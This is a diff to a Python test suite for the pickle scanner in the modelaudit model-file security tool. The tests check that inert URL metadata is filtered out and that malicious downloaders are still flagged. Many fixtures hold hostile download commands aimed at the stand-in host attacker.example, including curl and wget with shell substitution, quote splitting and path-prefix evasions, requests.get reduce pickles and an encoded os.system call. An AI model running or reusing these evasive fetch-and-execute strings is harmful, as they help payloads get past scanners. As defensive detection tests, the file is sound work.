@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import base64
 import hashlib
 import io
 import os
@@ -22,6 +23,8 @@ from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, Iss
 from modelaudit.scanners.joblib_scanner import JoblibScanner
 from modelaudit.scanners.pickle_scanner import (
     _BINARY_TAIL_SCAN_BYTES,
+    _MAX_RAW_ENCODED_BYTES,
+    _MAX_RAW_ENCODED_TOKENS,
     ALWAYS_DANGEROUS_FUNCTIONS,
     ALWAYS_DANGEROUS_MODULES,
     PickleScanner,
@@ -437,6 +440,23 @@ def _private_actionable_failed_checks(scan_result: dict[str, Any]) -> list[dict[
     if not isinstance(actionable_failed_checks, list):
         return []
     return [entry for entry in actionable_failed_checks if isinstance(entry, dict)]
+
+
+def _assert_critical_explicit_url(
+    result: ScanResult,
+    matched_text: str,
+    *,
+    rule_code: str = "S310",
+    require_pattern_type: bool = True,
+) -> None:
+    assert any(
+        issue.rule_code == rule_code
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and (not require_pattern_type or issue.details.get("pattern_type") == "url")
+        and issue.details.get("matched_text") == matched_text
+        for issue in result.issues
+    )
 
 
 def _assert_legacy_storage_layout_incomplete(result: ScanResult) -> None:
@@ -1059,6 +1079,455 @@ def test_scan_stream_detects_base64_encoded_execution_text(encoded: str, pattern
     assert encoded_issues[0].details["pattern"] == pattern
     assert encoded_issues[0].details["legacy_rule_aliases"] == ["S104"]
     assert not any(issue.message.startswith("Legacy encoded dangerous pattern detected") for issue in result.issues)
+
+
+@pytest.mark.parametrize(
+    "literal",
+    [
+        "See https://docs.example.invalid/reference/requests.get(url) for details",
+        "Author's docs: https://example.invalid/a'b/os.system(cmd)",
+        "metadata = 'https://docs.example.invalid/requests.get(url)?a=1&b=2;c=3'",
+        "description='docs'; metadata='https://docs.example.invalid/reference/requests.get(url)'",
+        "metadata={'url':'https://docs.example.invalid/reference/requests.get(url)','offset':-1}",
+        "metadata={'open':True,'url':'https://docs.example.invalid/reference/os.system(cmd)'}",
+        pytest.param(
+            ("A" * 4096)
+            + "https://docs.example.invalid/reference/requests.get(url)"
+            + "https://docs.example.invalid/%E2%98%83/%00/reference/os.system(cmd)"
+            + ("B" * 4096),
+            id="long-inert-8315",
+        ),
+    ],
+)
+def test_scan_stream_filters_proven_inert_pickle_url_metadata(literal: str) -> None:
+    if len(literal) > 8192:
+        assert len(literal) == 8315
+    payload = pickle.dumps({"metadata": literal}, protocol=4)
+    source = "long-url-metadata.pkl" if len(literal) > 8192 else "url-metadata.pkl"
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source=source)
+
+    assert result.success is True
+    assert not any(issue.rule_code in {"S302", "S309", "S310"} for issue in result.issues)
+    assert not any(
+        check.rule_code in {"S302", "S309", "S310"} and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("protocol", range(pickle.HIGHEST_PROTOCOL + 1))
+def test_scan_stream_ignores_passive_downloader_dict_keys(protocol: int) -> None:
+    payload = pickle.dumps(
+        {
+            "open": True,
+            "curl": "passive metadata",
+            "url": "https://docs.example.invalid/reference/os.system(command)",
+        },
+        protocol=protocol,
+    )
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="dict-key-metadata.pkl")
+
+    assert result.success is True
+    assert not any(issue.rule_code in {"S302", "S309", "S310"} for issue in result.issues)
+    assert not any(
+        check.rule_code in {"S302", "S309", "S310"} and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    ("protocol", "executable_value"),
+    [
+        pytest.param(b"\x80\x02", b"cdecimal\nDecimal\n", id="global"),
+        pytest.param(b"\x80\x04", b"\x8c\x07decimal\x8c\x07Decimal\x93", id="stack-global"),
+        pytest.param(b"\x80\x02", b"\x82\x01", id="ext1"),
+        pytest.param(b"\x80\x02", b"\x83\x01\x00", id="ext2"),
+        pytest.param(b"\x80\x02", b"\x84\x01\x00\x00\x00", id="ext4"),
+        pytest.param(b"\x80\x02", b"Pexternal-storage-key\n", id="persid"),
+        pytest.param(b"\x80\x02", b"Vexternal-storage-key\nQ", id="binpersid"),
+        pytest.param(b"\x80\x05", b"\x97", id="next-buffer"),
+        pytest.param(b"\x80\x05", b"\x97\x98", id="readonly-buffer"),
+        pytest.param(b"\x80\x02", b"cbuiltins\nstr\n)R", id="reduce"),
+        pytest.param(b"\x80\x02", b"cbuiltins\nobject\n)\x81}b", id="build"),
+    ],
+)
+def test_pickle_url_filter_fails_closed_for_executable_direct_dict_values(
+    protocol: bytes, executable_value: bytes
+) -> None:
+    payload = protocol + b"(dVcurl\n" + executable_value + b"sVurl\nVhttps://attacker.example/os.system(cmd)\ns."
+
+    assert pickle_scanner._pickle_literal_url_stripped_scan_view(payload, allow_filtering=True) == payload
+
+    result = PickleScanner(config={"enable_cache": False}).scan_stream(
+        io.BytesIO(payload), len(payload), source="executable-direct-dict-value.pkl"
+    )
+
+    assert any(
+        issue.rule_code in {"S309", "S310"} and issue.details.get("url") == "https://attacker.example/os.system(cmd)"
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_fails_closed_for_undecodable_literal_before_inert_url() -> None:
+    payload = pickle.dumps(
+        {"blob": b"\xff", "url": "https://docs.example.invalid/reference/os.system(command)"},
+        protocol=4,
+    )
+
+    assert pickle_scanner._pickle_literal_url_stripped_scan_view(payload, allow_filtering=True) == payload
+
+    result = PickleScanner(config={"enable_cache": False}).scan_stream(
+        io.BytesIO(payload), len(payload), source="binary-url-metadata.pkl"
+    )
+
+    assert result.success is True
+    assert any(
+        issue.rule_code == "S309"
+        and issue.severity == IssueSeverity.WARNING
+        and issue.details.get("url") == "https://docs.example.invalid/reference/os.system(command)"
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_keeps_undecodable_split_downloader_url_actionable() -> None:
+    payload = pickle.dumps(
+        {"blob": b"\xff", "argv": [b"curl"], "url": "https://attacker.example/payload"},
+        protocol=4,
+    )
+
+    assert pickle_scanner._pickle_literal_url_stripped_scan_view(payload, allow_filtering=True) == payload
+
+    result = PickleScanner(config={"enable_cache": False}).scan_stream(
+        io.BytesIO(payload), len(payload), source="binary-downloader.pkl"
+    )
+
+    assert any(
+        issue.rule_code == "S309"
+        and issue.severity == IssueSeverity.WARNING
+        and issue.details.get("url") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
+def test_pickle_url_filter_fails_closed_when_dict_key_is_reused_as_command() -> None:
+    downloader = "curl"
+    payload = pickle.dumps(
+        {downloader: True, "argv": [downloader], "url": "https://attacker.example/payload"},
+        protocol=4,
+    )
+
+    assert any(opcode.name == "BINGET" for opcode, _, _ in pickletools.genops(payload))
+    assert pickle_scanner._pickle_literal_url_stripped_scan_view(payload, allow_filtering=True) == payload
+
+
+def test_pickle_url_component_classification_is_bounded_for_many_components() -> None:
+    url = "https://docs.example.invalid/reference?x=1" + "".join(f"&field{index}=value" for index in range(2048))
+
+    assert pickle_scanner._trim_source_literal_url(url, fail_closed_ambiguous_shell_boundary=True) == url
+
+
+def test_scan_stream_keeps_execution_outside_long_pickle_url_metadata_actionable() -> None:
+    literal = (
+        ("A" * 4096)
+        + "https://docs.example.invalid/reference/requests.get(url)"
+        + "https://docs.example.invalid/%E2%98%83/%00/reference/os.system(cmd)"
+        + " requests.get('https://attacker.example/payload')"
+        + ("B" * 4096)
+    )
+    payload = pickle.dumps({"loader": literal}, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="long-network-loader.pkl")
+
+    assert any(
+        issue.rule_code == "S302"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("function") == "requests.get"
+        for issue in result.issues
+    )
+    _assert_critical_explicit_url(result, "https://attacker.example/payload")
+
+
+@pytest.mark.parametrize(
+    "literal",
+    [
+        '#!/bin/sh\nx="https://attacker.example/payload$(curl https://attacker2.example/x)"',
+        '#!/bin/sh\nx="$(curl https://attacker.example/payload)"',
+        '#!/bin/sh\nx="`curl https://attacker.example/payload`"',
+        '#!/bin/sh\nx="prefix $(curl https://attacker.example/payload) suffix"',
+    ],
+    ids=["url-first-dollar", "dollar-prefix", "backtick-prefix", "dollar-infix"],
+)
+def test_scan_stream_keeps_double_quoted_shell_substitution_actionable(literal: str) -> None:
+    payload = pickle.dumps({"loader": literal}, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="shell-url-substitution.pkl")
+
+    _assert_critical_explicit_url(result, "https://attacker.example/payload")
+
+
+@pytest.mark.parametrize(
+    ("literal", "expected_url"),
+    [
+        ("A" * 16 + "('https://attacker.example/payload')", "https://attacker.example/payload"),
+        (
+            "# docs one\n# docs two\ncurl https://attacker.example/payload",
+            "https://attacker.example/payload",
+        ),
+        (
+            "git clone https://attacker.example/payload # use docs example metadata reference",
+            "https://attacker.example/payload",
+        ),
+        ("https://attacker.example/payload;$CMD", "https://attacker.example/payload;$CMD"),
+        (
+            "https://attacker.example/payload?x=1&/tmp/payload",
+            "https://attacker.example/payload",
+        ),
+        (
+            "https://attacker.example/x?x=1&PATH=/tmp payload documentation reference example",
+            "https://attacker.example/x",
+        ),
+        (
+            "Documentation https://attacker.example/x;PATH=/tmp reference documentation example metadata",
+            "https://attacker.example/x;PATH=/tmp",
+        ),
+        ("https://attacker.example/payload?x=1&cmd.exe", "https://attacker.example/payload"),
+        ("See https://attacker.example/payload;./payload", "https://attacker.example/payload;./payload"),
+        (
+            "See https://attacker.example/payload&/tmp/payload",
+            "https://attacker.example/payload&/tmp/payload",
+        ),
+    ],
+)
+def test_scan_stream_does_not_hide_executable_url_lines_as_metadata(
+    literal: str,
+    expected_url: str,
+) -> None:
+    payload = pickle.dumps({"loader": literal}, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="executable-url-line.pkl")
+
+    _assert_critical_explicit_url(result, expected_url)
+
+
+@pytest.mark.parametrize("tail", [b"X", b"z"], ids=["truncated", "unknown-opcode"])
+def test_scan_stream_keeps_unproven_pickle_url_metadata_actionable(tail: bytes) -> None:
+    url = b"https://docs.example.invalid/reference/requests.get(url)"
+    payload = b"V" + url + b"\n" + tail
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="unproven-url.pkl")
+
+    _assert_critical_explicit_url(result, url.decode(), rule_code="S302", require_pattern_type=False)
+
+
+@pytest.mark.parametrize(
+    ("encoding", "encoded"),
+    [
+        (
+            "hex",
+            b"u='https://attacker.example/payload'-os.system(cmd)+'x'".hex(),
+        ),
+    ],
+)
+def test_scan_stream_keeps_encoded_execution_outside_url_actionable(encoding: str, encoded: str) -> None:
+    payload = pickle.dumps({"loader": f"encoded:{encoded}"}, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="encoded-network-loader.pkl")
+
+    assert any(
+        check.rule_code == "S604"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("encoding") == encoding
+        and check.details.get("pattern") == "os.system"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("encoding", ["base64", "hex"])
+def test_scan_stream_encoded_token_budgets_fail_closed(encoding: str) -> None:
+    def encode(value: bytes) -> str:
+        return base64.b64encode(value).decode("ascii") if encoding == "base64" else value.hex()
+
+    values = [f"encoded:{encode(f'benign-token-{index}'.encode())}" for index in range(_MAX_RAW_ENCODED_TOKENS)]
+    values.append("encoded:" + encode(b"os.system('id')"))
+    payload = pickle.dumps(values, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source=f"late-{encoding}.pkl")
+
+    assert result.success is False
+    assert "pickle_encoded_text_scan_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Pickle Encoded Text Coverage"
+        and check.details.get("encoding") == encoding
+        and check.details.get("limit_type") == "token"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("encoding", ["base64", "hex"])
+def test_scan_stream_encoded_decoded_byte_budgets_fail_closed(encoding: str) -> None:
+    decoded = b"os.system(" + (b"A" * _MAX_RAW_ENCODED_BYTES)
+    encoded = base64.b64encode(decoded).decode("ascii") if encoding == "base64" else decoded.hex()
+    payload = pickle.dumps({"loader": f"encoded:{encoded}"}, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source=f"large-{encoding}.pkl")
+
+    assert result.success is False
+    assert "pickle_encoded_text_scan_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Pickle Encoded Text Coverage"
+        and check.details.get("encoding") == encoding
+        and check.details.get("limit_type") == "decoded_byte"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("protocol", [0, 4], ids=["protocol-0", "protocol-4"])
+@pytest.mark.parametrize(
+    "loader",
+    [
+        "import requests as client\nclient.get('https://attacker.example/payload')",
+        "getattr(requests, 'get')('https://attacker.example/payload')",
+        "/usr/local/bin/wget https://attacker.example/payload",
+        "/custom/downloader/wget.exe https://attacker.example/payload # use documentation example",
+        ": use documentation now | /opt/tools/curl https://attacker.example/payload",
+        "echo use https://docs.example/x&/usr/local/bin/wget https://attacker.example/payload",
+        "echo use https://docs.example/x&&/usr/local/bin/wget https://attacker.example/payload",
+        ": use documentation now || /opt/tools/curl https://attacker.example/payload",
+        "echo use documentation now $(/srv/tools/curl.exe https://attacker.example/payload )",
+        "echo use documentation now `/srv/tools/wget https://attacker.example/payload `",
+        "printf 'use documentation https://attacker.example/payload' | /usr/bin/wget -i -",
+        "echo use documentation https://attacker.example/payload | xargs /usr/bin/wget",
+        "echo use documentation https://attacker.example/payload | \\\n /usr/bin/wget -i -",
+        ": use documentation now && /" + "/".join(["a"] * 17) + "/wget https://attacker.example/payload",
+        "/" + ("a" * 256) + "/wget https://attacker.example/payload # documentation example metadata",
+        ': use docs && "/opt/tools/curl.exe" https://attacker.example/payload',
+        "/usr/local/bin/wget\\\n https://attacker.example/payload # documentation example metadata",
+        "command 'wget' https://attacker.example/payload # documentation example metadata",
+        "/usr/local/bin/wget " + ("--header=x " * 48) + "use documentation now https://attacker.example/payload",
+        "requests.get(\\\n    'https://attacker.example/payload')",
+        "requests.get(\\\r\n    'https://attacker.example/payload')",
+        "Use documentation example metadata | git clone https://attacker.example/payload",
+        'Use documentation example metadata; c""url https://attacker.example/payload',
+        "Use documentation example metadata <(git clone https://attacker.example/payload )",
+        'f"{client:https://attacker.example/payload}"',
+        "'/usr/bin/curl' 'https://attacker.example/payload'",
+        "['/usr/bin/curl', 'https://attacker.example/payload']",
+        "cmd='/usr/bin/curl https://attacker.example/payload'",
+        "{'argv': ['curl'], 'url': 'https://attacker.example/payload'}",
+        "{'argv': [b'curl'], 'url': 'https://attacker.example/payload'}",
+        r"C:\Windows\System32\curl.exe https://attacker.example/payload",
+        "'/usr/bin/open' 'https://attacker.example/payload'",
+        "OPEN_MODE='safe' '/usr/bin/open' 'https://attacker.example/payload'",
+        "metadata='docs'; '/usr/bin/cu''rl' 'https://attacker.example/payload'",
+        "'env' '/usr/bin/curl' 'https://attacker.example/payload'",
+        "'sh' '-c' '/usr/bin/curl https://attacker.example/payload'",
+        "'/usr/bin/cu'\\\n'rl' 'https://attacker.example/payload'",
+    ],
+    ids=[
+        "alias",
+        "dynamic-getattr",
+        "path-prefixed-command",
+        "direct-command-trailing-comment",
+        "shell-pipe-path-prefixed-command",
+        "shell-ampersand-path-prefixed-command",
+        "shell-and-path-prefixed-command",
+        "shell-or-path-prefixed-command",
+        "shell-dollar-substitution",
+        "shell-backtick-substitution",
+        "url-first-stdin-pipeline",
+        "url-first-xargs-pipeline",
+        "url-first-continued-pipeline",
+        "deep-path-prefixed-command",
+        "long-path-segment-command",
+        "quoted-path-prefixed-command",
+        "shell-continuation-command",
+        "quoted-command-wrapper",
+        "truncated-line-prefix",
+        "lf-continuation",
+        "crlf-continuation",
+        "prose-prefixed-shell-pipeline",
+        "quote-joined-shell-command",
+        "process-substitution",
+        "f-string-format-dispatch",
+        "adjacent-curl-argv",
+        "list-curl-argv",
+        "assigned-curl-command",
+        "split-dict-curl-argv",
+        "bytes-split-dict-curl-argv",
+        "windows-curl-command",
+        "adjacent-open-argv",
+        "assignment-adjacent-open-argv",
+        "assignment-split-adjacent-curl-argv",
+        "adjacent-env-curl-argv",
+        "adjacent-sh-c-argv",
+        "line-continued-adjacent-curl-argv",
+    ],
+)
+def test_scan_stream_keeps_executable_pickle_urls_actionable(loader: str, protocol: int) -> None:
+    payload = pickle.dumps({"loader": loader}, protocol=protocol)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="network-loader.pkl")
+
+    _assert_critical_explicit_url(result, "https://attacker.example/payload")
+
+
+def test_run_root_raw_detectors_filters_completed_raw_slice(monkeypatch: pytest.MonkeyPatch) -> None:
+    scanner = PickleScanner()
+    result = scanner._create_result()
+    data = pickle.dumps({"metadata": "https://docs.example.invalid/reference/os.system(command)"}, protocol=4)
+    result.metadata.update(
+        {
+            "pickle_report_status": "complete",
+            "pickle_verdict": "clean",
+            "pickle_coverage": {
+                "bytes_scanned": len(data),
+                "bytes_total": len(data) + 1024,
+                "raw_scan_complete": True,
+                "opcode_scan_complete": True,
+            },
+        }
+    )
+    observed_allow_filtering: list[bool] = []
+
+    def record_filtering(scan_data: bytes, *, allow_filtering: bool) -> bytes:
+        observed_allow_filtering.append(allow_filtering)
+        return scan_data
+
+    monkeypatch.setattr(pickle_scanner, "_pickle_literal_url_stripped_scan_view", record_filtering)
+
+    scanner._run_root_raw_detectors(data, result, "slice.pkl")
+
+    assert observed_allow_filtering == [True]
+
+
+def test_scan_stream_keeps_split_downloader_pickle_url_actionable() -> None:
+    payload = pickle.dumps({"argv": [b"curl"], "url": "https://attacker.example/payload"}, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="split-downloader.pkl")
+
+    _assert_critical_explicit_url(result, "https://attacker.example/payload")
+
+
+def test_scan_stream_keeps_network_reduce_url_actionable() -> None:
+    payload = b"crequests\nget\n(Vhttps://attacker.example/payload\ntR."
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="network-reducer.pkl")
+
+    assert any(
+        issue.details.get("import_reference") == "requests.get" and issue.severity == IssueSeverity.CRITICAL
+        for issue in result.issues
+    )
+    assert any(
+        issue.rule_code == "S309"
+        and issue.severity == IssueSeverity.WARNING
+        and issue.details.get("type") == "url_detected"
+        and issue.details.get("url") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+    _assert_critical_explicit_url(
+        result,
+        "https://attacker.example/payload",
+        require_pattern_type=False,
+    )
 
 
 def test_hex_token_seed_gate_reuses_lowered_token() -> None:
@@ -1727,7 +2196,7 @@ def test_scan_stream_fails_closed_when_supplemental_raw_analysis_cannot_read() -
         source="unreadable-supplement.pkl",
     )
 
-    assert any(
+    assert not any(
         check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
         for check in readable_result.checks
     )
